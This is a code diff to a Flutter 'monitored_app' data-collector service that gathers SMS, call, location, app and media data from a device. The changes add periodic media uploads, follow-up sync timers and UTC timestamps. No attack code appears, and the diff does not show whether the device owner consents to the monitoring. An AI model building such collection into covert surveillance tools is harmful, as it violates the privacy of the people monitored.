@@ -22,6 +22,7 @@ import 'package:monitored_app/core/collectors/base_collector.dart';
 
 import 'package:monitored_app/core/api/api_client.dart';
 import 'package:monitored_app/core/services/battery_optimization_service.dart';
+import 'package:monitored_app/core/services/media_upload_service.dart';
 import 'package:monitored_app/core/utils/retry_mechanism.dart';
 import 'package:monitored_app/core/sync/sync_status_monitor.dart';
 
@@ -136,11 +137,13 @@ class DataCollectorService {
   Timer? _syncTimer;
   Timer? _prioritySyncTimer;
   Timer? _ownershipHeartbeatTimer;
+  Timer? _followUpSyncTimer;
   bool _isInitialized = false;
   bool _isSyncing = false;
   bool _isOptimizing = false;
   bool _isRunning = false; // Tracks whether collectors are actively running
   String? _collectionOwner;
+  int _queueRevision = 0;
 
   // Sync optimization metrics
   final Map<String, int> _syncSuccessCount = {};
@@ -237,11 +240,8 @@ class DataCollectorService {
     // Apply server configuration to collectors
     await _applyServerConfiguration();
 
-    // Set callbacks for all collectors to avoid circular dependency
-    _smsCollector.setDataCollectedCallback(queueForSync);
-    _callsCollector.setDataCollectedCallback(queueForSync);
-    _locationCollector.setDataCollectedCallback(queueForSync);
-    _appsCollector.setDataCollectedCallback(queueForSync);
+    // Set callbacks for media collectors (other collectors use the database
+    // notification path via DatabaseService.setDataNotificationCallback above)
     _mediaCollector.setDataCollectedCallback(queueForSync);
     _mediaStoreCollector.setDataCollectedCallback(queueForSync);
 
@@ -370,8 +370,16 @@ class DataCollectorService {
       await _mediaStoreCollector.startCollecting();
 
       // Start sync timer (every 15 minutes)
-      _syncTimer = Timer.periodic(const Duration(minutes: 15), (_) {
+      _syncTimer = Timer.periodic(const Duration(minutes: 15), (_) async {
         _syncData(owner: owner);
+        // Periodic upload cycle: catches TEMP media even when the queue is
+        // empty (no new metadata). Mirrors MediaStore scan cadence.
+        final periodicDeviceId = await _resolveBackendDeviceIdForSync();
+        if (periodicDeviceId != null) {
+          unawaited(
+            locator<MediaUploadService>().uploadPendingMedia(periodicDeviceId),
+          );
+        }
       });
 
       // Do an initial sync
@@ -388,6 +396,8 @@ class DataCollectorService {
     String? owner,
     bool releaseLease = true,
   }) async {
+    _cancelSyncTimers();
+
     if (!_isRunning) {
       debugPrint(
           '[DataCollector] stopCollectors() skipped: collectors not running');
@@ -397,10 +407,6 @@ class DataCollectorService {
       return;
     }
     _isRunning = false;
-
-    // Cancel sync timer
-    _syncTimer?.cancel();
-    _syncTimer = null;
 
     // Stop all collectors
     await _smsCollector.stopCollecting();
@@ -418,6 +424,15 @@ class DataCollectorService {
     }
   }
 
+  void _cancelSyncTimers() {
+    _syncTimer?.cancel();
+    _syncTimer = null;
+    _prioritySyncTimer?.cancel();
+    _prioritySyncTimer = null;
+    _followUpSyncTimer?.cancel();
+    _followUpSyncTimer = null;
+  }
+
   void queueForSync(String dataType, List<dynamic> items, {int priority = 2}) {
     if (items.isEmpty) return;
 
@@ -427,12 +442,19 @@ class DataCollectorService {
       _syncPriorities[dataType] = priority;
     }
 
+    var addedItems = 0;
     for (final item in items) {
       if (_isDuplicateQueuedItem(dataType, item)) {
         continue;
       }
       _syncQueue[dataType]!.add(item);
+      addedItems++;
     }
+
+    if (addedItems == 0) {
+      return;
+    }
+    _queueRevision += addedItems;
 
     // Update priority if higher priority items are added
     if (_syncPriorities[dataType]! > priority) {
@@ -467,7 +489,8 @@ class DataCollectorService {
 
   Future<void> _syncData({String? owner}) async {
     if (_isSyncing || _syncQueue.isEmpty) {
-      debugPrint('[DataCollector] Sync: isSyncing=$_isSyncing, queueEmpty=${_syncQueue.isEmpty}');
+      debugPrint(
+          '[DataCollector] Sync: isSyncing=$_isSyncing, queueEmpty=${_syncQueue.isEmpty}');
       return;
     }
 
@@ -494,7 +517,11 @@ class DataCollectorService {
     }
 
     _isSyncing = true;
+    _followUpSyncTimer?.cancel();
+    _followUpSyncTimer = null;
     _syncStatusMonitor.onSyncStarted();
+    final queueRevisionAtStart = _queueRevision;
+    var madeProgress = false;
 
     try {
       // Vérifier la connectivité
@@ -525,9 +552,10 @@ class DataCollectorService {
       // Try intelligent bulk sync for compatible data types
       final bulkCandidate =
           _identifyBulkSyncCandidate(sortedDataTypes, batteryLevel);
-      final bulkAttemptedDataTypes = <String>{};
       if (bulkCandidate.isNotEmpty) {
-        bulkAttemptedDataTypes.addAll(bulkCandidate);
+        debugPrint(
+          '[BulkSync] Candidates: ${bulkCandidate.map((type) => '$type=${_syncQueue[type]?.length ?? 0}').join(', ')}',
+        );
         final bulkSyncedIndexesByType = await _sendOptimizedBulkBatch(
             deviceId, batteryLevel, bulkCandidate);
         final hasBulkSyncedItems = bulkSyncedIndexesByType != null &&
@@ -565,6 +593,7 @@ class DataCollectorService {
               syncedItems.length,
               dataType,
             );
+            madeProgress = true;
           }
 
           // Mark database items as synced
@@ -579,6 +608,11 @@ class DataCollectorService {
 
           debugPrint(
               'Optimized bulk sync completed: ${bulkCandidate.length} types, ${allSyncedItems.length} items');
+          if (bulkCandidate.contains('media_metadata')) {
+            unawaited(
+              locator<MediaUploadService>().uploadPendingMedia(deviceId),
+            );
+          }
           if (_syncQueue.isEmpty) {
             _isSyncing = false;
             return;
@@ -589,18 +623,13 @@ class DataCollectorService {
       // Process individual data types by priority
       for (final dataType in sortedDataTypes) {
         if (!_syncQueue.containsKey(dataType)) continue;
-        if (bulkAttemptedDataTypes.contains(dataType)) {
-          debugPrint(
-            'Skipping individual $dataType sync this cycle after bulk attempt',
-          );
-          continue;
-        }
 
         final items = _syncQueue[dataType]!;
         if (items.isEmpty) continue;
 
         if (!_isCollectApiDataType(dataType)) {
           await _markUnsupportedCollectTypeAsHandled(dataType);
+          madeProgress = true;
           continue;
         }
 
@@ -659,9 +688,15 @@ class DataCollectorService {
           // Record successful sync metrics
           _recordSyncSuccess(dataType, syncedItems.length);
           _syncStatusMonitor.onSyncCompleted(syncedItems.length, dataType);
+          madeProgress = true;
 
           debugPrint(
               'Synced $dataType batch: ${syncedItems.length}/${batch.length} items');
+          if (dataType == 'media_metadata') {
+            unawaited(
+              locator<MediaUploadService>().uploadPendingMedia(deviceId),
+            );
+          }
         } else if (syncResult.permanentFailure) {
           final failedItems =
               batch.whereType<Map<String, dynamic>>().toList(growable: false);
@@ -683,6 +718,7 @@ class DataCollectorService {
           _recordSyncFailure(dataType);
           _syncStatusMonitor.onSyncFailed(
               dataType, 'Batch sync failed permanently');
+          madeProgress = true;
           debugPrint(
               'Marked $dataType batch as permanently failed after retry budget');
         } else {
@@ -700,6 +736,25 @@ class DataCollectorService {
       debugPrint('Error syncing data: $e');
     } finally {
       _isSyncing = false;
+      final databaseService = locator<DatabaseService>();
+      final queueRevisionBeforeReload = _queueRevision;
+      await databaseService.loadPendingDataToCollector();
+
+      final queuedDuringSync = _queueRevision > queueRevisionAtStart;
+      final loadedFromDatabase = _queueRevision > queueRevisionBeforeReload;
+      final shouldFollowUp = _syncQueue.isNotEmpty &&
+          (madeProgress || queuedDuringSync || loadedFromDatabase);
+
+      if (shouldFollowUp) {
+        _followUpSyncTimer?.cancel();
+        _followUpSyncTimer = Timer(const Duration(seconds: 10), () {
+          debugPrint(
+            '[DataCollector] Follow-up sync: flushing remaining '
+            '${_syncQueue.values.fold(0, (sum, items) => sum + items.length)} items',
+          );
+          _syncData(owner: _collectionOwner);
+        });
+      }
     }
   }
 
@@ -725,7 +780,7 @@ class DataCollectorService {
           'data_type': _mapApiDataType(dataType),
           'items': preparedBatch.items,
           'metadata': {
-            'collection_timestamp': DateTime.now().toIso8601String(),
+            'collection_timestamp': DateTime.now().toUtc().toIso8601String(),
             'battery_level':
                 await locator<BatteryMonitorService>().getCurrentBatteryLevel(),
             'network_type': await _getNetworkType(),
@@ -844,14 +899,16 @@ class DataCollectorService {
     String owner = CollectionLeaseOwner.mainIsolate,
   }) async {
     try {
-      debugPrint('[DataCollector] Releasing prior lease due to permission change');
-      await _releaseCollectionOwnership(null);
-      _isRunning = false;
+      debugPrint(
+          '[DataCollector] Stopping prior collectors due to permission change');
+      await stopCollectors(owner: _collectionOwner);
 
-      debugPrint('[DataCollector] Restarting collectors after permission change');
+      debugPrint(
+          '[DataCollector] Restarting collectors after permission change');
       await startCollectors(owner: owner);
     } catch (e) {
-      debugPrint('[DataCollector] Error restarting after permission change: $e');
+      debugPrint(
+          '[DataCollector] Error restarting after permission change: $e');
     }
   }
 
@@ -1110,7 +1167,7 @@ class DataCollectorService {
           'device_id': deviceId,
           'data_batches': dataBatches,
           'metadata': {
-            'sync_timestamp': DateTime.now().toIso8601String(),
+            'sync_timestamp': DateTime.now().toUtc().toIso8601String(),
             'battery_level': batteryLevel,
             'network_type': await _getNetworkType(),
             'app_version': '1.0.0',
@@ -1616,7 +1673,7 @@ class DataCollectorService {
       case 'location':
         cleanItem['recorded_at'] =
             _firstStringValue(cleanItem, ['recorded_at', 'collected_at']) ??
-                DateTime.now().toIso8601String();
+                DateTime.now().toUtc().toIso8601String();
         return cleanItem;
       case 'app_usage':
         final startTime = _firstStringValue(cleanItem, ['start_time']);
@@ -1634,7 +1691,7 @@ class DataCollectorService {
         _truncateStringField(cleanItem, 'app_category');
         cleanItem['recorded_at'] =
             _firstStringValue(cleanItem, ['recorded_at', 'collected_at']) ??
-                DateTime.now().toIso8601String();
+                DateTime.now().toUtc().toIso8601String();
         return cleanItem;
       default:
         return cleanItem;
